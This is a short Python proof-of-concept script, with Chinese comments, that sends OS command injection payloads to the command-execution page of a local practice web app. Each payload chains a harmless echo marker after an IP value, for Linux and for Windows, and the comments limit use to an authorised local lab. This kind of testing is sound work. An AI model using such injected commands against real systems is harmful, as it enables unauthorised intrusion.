import sys
import urllib.parse
import urllib.request

# 仅指向授权本机靶场，路径与端口需按实际靶场填写
LAB_URL = "http://127.0.0.1:8080/vulnerabilities/exec/"

# 两个系统分支分开提交，不混用语法
PAYLOADS = {
    "linux": "127.0.0.1; echo LAB_POC_MARKER_A04",
    "windows": "127.0.0.1 & echo LAB_POC_MARKER_A04",
}


def send(target_os):
    body = urllib.parse.urlencode({
        "ip": PAYLOADS[target_os],
        "Submit": "Submit",
    }).encode("utf-8")
    req = urllib.request.Request(LAB_URL, data=body, method="POST")
    # 靶场若需认证，由测试人员在本地文件中提供 Cookie，再通过 add_header 注入
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode("utf-8", "replace")


if __name__ == "__main__":
    branch = sys.argv[1] if len(sys.argv) > 1 else "linux"
    print(send(branch))
